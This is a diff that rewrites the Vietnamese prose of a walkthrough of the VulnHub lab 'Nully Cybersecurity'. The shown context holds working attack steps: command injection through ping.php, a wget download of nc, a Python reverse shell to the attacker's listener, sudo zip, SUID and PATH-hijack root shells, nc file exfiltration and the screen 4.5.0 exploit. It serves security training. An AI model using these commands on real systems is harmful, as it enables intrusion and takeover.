@@ -430,13 +430,13 @@ quả hàng đầu. Khởi đầu trong tay chỉ có một địa chỉ IP, r�
 root. Bài này đáng để bắt đầu, vì nó không phải một câu đố đơn lẻ. Nó là ba máy nối
 chuỗi với nhau, ta phải pivot từ máy này sang máy kế tiếp.
 
-Đi hết bài, ta chạm vào gần như mọi bước của một đợt pentest thật: recon, đọc mail
-server, crack password, command injection, reverse shell, pivot mạng, cùng bốn năm
-kiểu leo quyền khác nhau.
+Đi hết bài, ta sẽ trải qua gần như mọi giai đoạn của một đợt pentest thực tế: recon,
+đọc mail server, crack password, command injection, reverse shell, pivot mạng, cùng
+bốn năm kỹ thuật leo quyền khác nhau.
 
 ---
 
-## Tự chạy tái lập
+## Môi trường thực hành
 
 Tải đúng máy ảo này về rồi làm theo từng bước.
 
@@ -454,13 +454,13 @@ Setup tôi dùng:
 1. Tải OVA từ trang VulnHub rồi import vào VirtualBox (tác giả lưu ý nó chạy mượt
    trên VirtualBox hơn VMware). Trước khi import, nhớ check file tải về với checksum
    MD5/SHA1 ghi trên trang VulnHub.
-2. Gắn máy target vào card mạng Host-Only để nó chỉ nói chuyện được với máy attack
-   của ta, không ra được internet. Vừa giữ lab an toàn, vừa cho kết quả scan sạch.
+2. Gắn máy target vào card mạng Host-Only để máy chỉ kết nối được với máy tấn công
+   của ta, không ra internet. Vừa giữ lab an toàn, vừa giúp kết quả quét mạng chính xác.
 3. Chạy một máy attack Kali (hay Linux bất kỳ) trong cùng mạng host-only đó.
 
-> Xuyên suốt bài, target lần đầu xuất hiện ở `192.168.1.46`. IP của bạn chắc chắn
-> khác, thấy ở đâu thì thay bằng IP của bạn. Máy này dựng làm hai lần khác nhau, nên
-> vài IP nội bộ có đổi chỗ giữa chừng, tôi sẽ nhắc ngay tại chỗ nó xảy ra.
+> Trong bài viết này, target ban đầu xuất hiện tại `192.168.1.46`. Dải IP trên máy bạn
+> có thể khác, hãy thay thế tương ứng khi thực hành. Do bài lab được dựng trong hai đợt
+> khác nhau nên một vài IP nội bộ có sự thay đổi, tôi sẽ lưu ý rõ ngay tại bước tương ứng.
 
 ---
 
@@ -499,8 +499,8 @@ Có năm port mở:
 | 8000 | HTTP (một web app khác) |
 | 9000 | (dùng ở phần sau) |
 
-Trang web ở port 80 ngầm gợi ý chỉ POP3 (110) và SSH (2222) mới được đánh từ ngoài,
-và nó đưa luôn cho ta một bộ thông tin đăng nhập hòm thư.
+Trang web ở port 80 ngầm gợi ý rằng ta chỉ có thể tiếp cận cổng POP3 (110) và SSH (2222)
+từ bên ngoài, đồng thời cung cấp sẵn một tài khoản đăng nhập hòm thư.
 
 ### Đọc mail qua POP3
 
@@ -517,9 +517,10 @@ RETR 1
 
 ![Đọc email của Bob qua POP3]({{ '/images/nully-cybersecurity/02-pop3-mail.png' | relative_url }})
 
-Chỉ có đúng một thư, từ Bob Smith, admin của mail server. Anh ta nói password của
-mình đơn giản lắm. Đó mới là gợi ý đáng giá: admin hay đặt password theo tên mình,
-mà password yếu thì chẳng khác gì mời brute force.
+Chỉ có một thư duy nhất từ Bob Smith, quản trị viên của mail server. Trong thư, Bob
+thừa nhận mật khẩu của mình rất đơn giản. Đây là gợi ý quan trọng: quản trị viên thường
+có xu hướng đặt mật khẩu liên quan đến tên riêng, và mật khẩu yếu như vậy rất dễ bị bẻ
+khóa bằng brute force.
 
 ### Brute-force SSH bằng account Bob
 
@@ -548,9 +549,9 @@ khác:
 sudo -l
 ```
 
-Bob được chạy `/opt/scripts/check.sh` dưới account `my2user`. Mà script đó lại write
-được, nên ta chèn thêm một dòng mở shell (`/bin/bash`) rồi chạy. Đây là pha đi ngang
-kinh điển để qua account khác:
+Bob được phép chạy `/opt/scripts/check.sh` dưới tài khoản `my2user`. Vì script này có
+quyền ghi (writable), ta chèn thêm một dòng mở shell (`/bin/bash`) rồi thực thi. Đây là
+bước di chuyển ngang (lateral movement) kinh điển để sang tài khoản khác:
 
 ```bash
 sudo -u my2user /bin/bash /opt/scripts/check.sh
@@ -567,12 +568,14 @@ TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh #'
 ```
 
-Vì sao cách này chạy được, nói cho dễ hiểu:
+Nguyên lý hoạt động:
 
-- `zip` chạy với quyền root, nên thứ gì nó khởi chạy cũng là root.
-- `-T` bảo `zip` test cái archive sau khi tạo xong.
-- `-TT 'sh #'` thay lệnh test mặc định bằng lệnh của ta. `zip` chạy `sh`, một shell
-  root, còn dấu `#` comment out hết phần sau của dòng.
+- `zip` được thực thi dưới quyền root, nên mọi tiến trình con do nó khởi tạo đều kế thừa
+  quyền root.
+- Cờ `-T` yêu cầu `zip` kiểm tra tính toàn vẹn của archive sau khi nén.
+- Cờ `-TT 'sh #'` thay thế lệnh kiểm tra mặc định bằng lệnh do ta chỉ định. `zip` sẽ
+  gọi `sh` (shell với quyền root), còn ký tự `#` dùng để loại bỏ phần còn lại của câu
+  lệnh gốc.
 
 Xâm nhập mail server thành công. Flag 1 về tay.
 
@@ -600,9 +603,9 @@ netdiscover -i eth0 -r 172.17.0.0/16
 
 ### Kéo web app ẩn về máy mình
 
-Laptop attack của ta không với thẳng tới `172.17.0.x` được, nên ta dựng một SSH
-tunnel (local port forward) luồn qua mail server. Nhờ vậy web server ở xa hiện ra
-thành `localhost:8000` ngay trên máy ta:
+Máy tấn công của ta không thể kết nối trực tiếp tới dải `172.17.0.x`, nên ta tạo
+một SSH tunnel (local port forward) qua mail server. Nhờ vậy, web server nội bộ
+được chuyển tiếp về thẳng `localhost:8000` ngay trên máy ta:
 
 ```bash
 ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i id_rsa
@@ -620,8 +623,9 @@ Giờ `http://localhost:8000` chính là web server nội bộ.
 dirb http://localhost:8000
 ```
 
-Kết quả tìm ra folder `/ping/` list được, bên trong có `ping.php`. Một ghi chú trên trang
-bảo dùng param `host`, và nó đem giá trị đó chạy thẳng, không check gì:
+Kết quả tìm ra thư mục `/ping/` cho phép liệt kê file (directory listing), bên trong
+có `ping.php`. Ghi chú trên trang cho biết script nhận tham số `host`, và giá trị này
+được đưa trực tiếp vào hàm thực thi lệnh hệ thống mà không qua khâu lọc dữ liệu:
 
 ```
 http://localhost:8000/ping/ping.php?host=172.17.0.1
@@ -642,9 +646,9 @@ http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
 http://localhost:8000/ping/ping.php?host=; chmod 777 nc
 ```
 
-Reverse shell bằng `nc` không chạy được, vì bản build này thiếu option `-e`, nên ta chuyển
-sang một dòng Python. Nó connect ngược về listener ta chạy trên mail server, chính
-là máy pivot của ta, tại `172.17.0.5:9000`:
+Reverse shell bằng `nc` không thành công vì bản netcat trên máy đích không hỗ trợ
+cờ `-e`. Ta chuyển sang một dòng lệnh Python kết nối ngược về listener đang chạy
+trên mail server (máy pivot) tại `172.17.0.5:9000`:
 
 ```python
 python3 -c 'import socket,subprocess,os;
@@ -654,8 +658,9 @@ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
 subprocess.call(["/bin/sh","-i"])'
 ```
 
-Từng mảnh làm gì: tạo một socket mạng, connect ngược về listener của ta, đấu input,
-output và lỗi của shell (`0`, `1`, `2`) vào socket đó, rồi bật một shell tương tác.
+Giải thích từng thành phần: tạo socket mạng, kết nối ngược về listener của ta,
+chuyển hướng các luồng dữ liệu chuẩn (stdin, stdout, stderr tương ứng `0`, `1`, `2`)
+vào socket đó, rồi mở một shell tương tác.
 
 > Lưu ý về IP: sau một lần reboot VM, các địa chỉ nội bộ đổi chỗ. Tại thời điểm này
 > `172.17.0.5` là mail server (listener của ta), `172.17.0.2` là file server, còn
@@ -664,7 +669,8 @@ output và lỗi của shell (`0`, `1`, `2`) vào socket đó, rồi bật một
 
 ![Reverse shell với quyền www-data]({{ '/images/nully-cybersecurity/07-reverse-shell.png' | relative_url }})
 
-Reverse thành công, ta vào được với quyền thấp của `www-data`.
+Khai thác reverse shell thành công, ta chiếm được phiên làm việc với quyền người
+dùng `www-data`.
 
 ### Hai user, hai đường leo quyền
 
@@ -675,26 +681,26 @@ find / -type f -user 1000 2>/dev/null   # Oscar
 find / -type f -user 1001 2>/dev/null   # Oliver
 ```
 
-Oliver bỏ quên một file backup `.secret`, bên trong có luôn password của anh ta
-(`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`), nên ta login thành Oliver.
+Oliver bỏ quên một file backup `.secret`, bên trong lưu sẵn mật khẩu của anh ta
+(`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`), giúp ta đăng nhập trực tiếp vào tài khoản Oliver.
 
-Oscar thì sở hữu một `python3` có bit SUID, tức chương trình luôn chạy dưới quyền
-của owner. Chạy nó với cờ privileged thì nó giữ nguyên quyền Oscar chứ không tụt
-xuống:
+Về phía Oscar, tài khoản này sở hữu một binary `python3` có bit SUID, đồng nghĩa với việc
+chương trình luôn chạy dưới quyền của chủ sở hữu. Thực thi Python ở chế độ privileged sẽ
+giữ nguyên quyền hạn của Oscar thay vì bị hệ thống tự động hạ quyền:
 
 ```bash
 python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
-Cái `-p` là chế độ privileged: không hạ cái quyền vừa nâng được. Từ home của Oscar,
-ta lấy được password của anh ta (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`) rồi SSH vào
-trực tiếp bằng account Oscar.
+Cờ `-p` kích hoạt chế độ privileged, ngăn shell tự động hạ quyền SUID. Trong thư mục home
+của Oscar, ta tìm thấy mật khẩu của tài khoản này (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`),
+từ đó có thể SSH trực tiếp bằng tài khoản Oscar.
 
 ### Lên root bằng PATH hijack
 
-Home của Oscar có folder `/scripts` chứa chương trình SUID-root tên `current-date`.
-SUID-root nghĩa là nó luôn chạy dưới quyền root, bất kể ai khởi chạy. Ta soi string
-trong nó:
+Thư mục home của Oscar có thư mục con `/scripts` chứa chương trình SUID-root tên
+`current-date`. SUID-root nghĩa là chương trình luôn thực thi dưới quyền root, bất kể
+ai khởi chạy. Ta kiểm tra các chuỗi ký tự trong binary:
 
 ```bash
 strings current-date
@@ -702,10 +708,11 @@ strings current-date
 
 ![Output strings của current-date]({{ '/images/nully-cybersecurity/08-strings-current-date.png' | relative_url }})
 
-Nó gọi `date` mà không kèm full path, không phải `/bin/date`. Vậy là hệ thống đi tìm
-`date` trong các folder liệt kê ở `$PATH`, mà `$PATH` thì nằm trong tay ta. Ta cắm
-vào một `date` giả, hễ chạy là mở shell giữ nguyên quyền root, đẩy folder của nó lên
-đầu `$PATH`, rồi chạy `current-date`:
+Chương trình gọi lệnh `date` mà không dùng đường dẫn tuyệt đối (chẳng hạn `/bin/date`).
+Khi đó, hệ thống sẽ tìm kiếm binary `date` theo thứ tự các thư mục trong biến môi
+trường `$PATH`. Vì `$PATH` nằm trong quyền kiểm soát của người dùng, ta có thể tạo một
+file `date` giả lập để mở shell duy trì quyền root, đưa thư mục chứa file này lên đầu
+`$PATH`, rồi thực thi `current-date`:
 
 ```bash
 cd /tmp
@@ -715,12 +722,12 @@ export PATH=/tmp:$PATH
 current-date
 ```
 
-Cái `-p` ở đây mới là mấu chốt. Một `bash` bình thường bỏ quyền SUID ngay lúc khởi
-chạy, thiếu nó là rớt về lại user của ta. Có `-p`, shell giữ nguyên quyền root nó
-thừa hưởng từ `current-date` SUID.
+Cờ `-p` ở đây là điểm then chốt. Theo mặc định, `bash` sẽ tự động hủy quyền SUID khi
+khởi chạy; nếu không có `-p`, shell sẽ rơi về quyền người dùng thông thường. Khi có cờ
+`-p`, shell sẽ giữ nguyên quyền root thừa hưởng từ binary `current-date`.
 
-> Báo cáo gốc cũng làm đúng kiểu PATH hijack này nhưng giữ các lệnh chính xác trong
-> ảnh. Khối lệnh trên là cách chuẩn, chạy được, cho kỹ thuật này.
+> Báo cáo gốc cũng áp dụng kỹ thuật PATH hijack tương tự nhưng giữ các lệnh cụ thể trong
+> ảnh chụp. Khối lệnh trên là cách làm chuẩn mực và thực thi trực tiếp được.
 
 ![Root trên web server, 2_flag.txt]({{ '/images/nully-cybersecurity/09-root-web-server.png' | relative_url }})
 
@@ -732,13 +739,13 @@ Giờ ta làm chủ web server. Tìm ra `2_flag.txt`.
 
 ### Khai thác file server qua FTP ẩn danh
 
-Từ web server, ta với tới file server ở `172.17.0.2`, nơi cho phép FTP ẩn danh:
-login bằng username `anonymous`, password để trống.
+Từ web server, ta kết nối tới file server tại `172.17.0.2`. Máy chủ này cho phép đăng
+nhập FTP ẩn danh: username `anonymous`, mật khẩu để trống.
 
 ![FTP ẩn danh được bật]({{ '/images/nully-cybersecurity/10-anonymous-ftp.png' | relative_url }})
 
-Bên trong có `file.txt` (chẳng có gì) và `backup.zip`. Ta kéo archive về máy mình
-bằng `netcat` cho dễ làm:
+Bên trong có `file.txt` (nội dung trống) và `backup.zip`. Ta chuyển archive về máy cá
+nhân bằng `netcat` để tiện xử lý:
 
 ```bash
 # trên server từ xa
@@ -747,40 +754,40 @@ nc -w 3 192.168.18.145 8888 < backup.zip
 nc -lvnp 8888 > backup.zip
 ```
 
-### Crack password của archive
+### Bẻ khóa mật khẩu archive
 
-File zip bị mã hóa. `zip2john` biến nó thành một hash để `john` (John the Ripper)
-đem crack:
+File zip đã được đặt mật khẩu bảo vệ. Ta dùng `zip2john` để trích xuất chuỗi hash
+rồi chuyển cho `john` (John the Ripper) bẻ khóa:
 
 ```bash
 zip2john backup.zip > zip.hash
 john zip.hash
 ```
 
-Password là `1234567890`.
+Mật khẩu tìm được là `1234567890`.
 
 ![john crack mật khẩu zip]({{ '/images/nully-cybersecurity/11-john-zip-crack.png' | relative_url }})
 
-Bên trong là thông tin đăng nhập của một user tên donald, người có quyền vào
-database server. Ta SSH sang đó ngay từ web server.
+Bên trong file nén chứa thông tin đăng nhập của tài khoản donald, người có quyền truy
+cập database server. Ta SSH sang máy chủ đó trực tiếp từ web server.
 
 ### Lên root bằng exploit screen
 
-Trên database server, `linpeas` (tool tự động dò đường leo quyền) soi ra một binary
-SUID: `screen-4.5.0`. Đúng cái version này có một lỗ hổng local root đã công bố,
-[Exploit-DB 41154](https://www.exploit-db.com/raw/41154).
+Trên database server, `linpeas` (công cụ tự động rà soát leo quyền) phát hiện một
+binary SUID: `screen-4.5.0`. Phiên bản này tồn tại một lỗ hổng leo quyền root cục bộ
+đã được công bố: [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).
 
-Nói gọn: `screen` chạy dưới quyền root, và bản này xử lý lỏng lẻo option log-file, nên
-bị lợi dụng để nạp một shared library do attacker đưa vào, dưới quyền root. Cái exploit
-người ta public ra là một shell script chạy một mình được: nó tự viết và compile hai
-file phụ nhỏ, một library và một chương trình root-shell bé tẹo, rồi khởi chạy
-`screen` để library đó nạp với quyền root:
+Tóm tắt nguyên lý: `screen` chạy với đặc quyền root và xử lý tham số log-file không
+chặt chẽ, dẫn đến khả năng nạp một shared library tùy ý dưới quyền root. Script khai
+thác công khai là một shell script hoạt động độc lập: script tự tạo và biên dịch một
+thư viện chia sẻ cùng một chương trình root-shell nhỏ, sau đó gọi `screen` để nạp
+thư viện đó:
 
 ```bash
 # lưu Exploit-DB 41154 thành 41154.sh, rồi:
 chmod +x 41154.sh
 ./41154.sh
-# -> thả bạn vào một shell root
+# -> mở ra shell với quyền root
 ```
 
 ![Root trên database server]({{ '/images/nully-cybersecurity/12-root-db-server.png' | relative_url }})
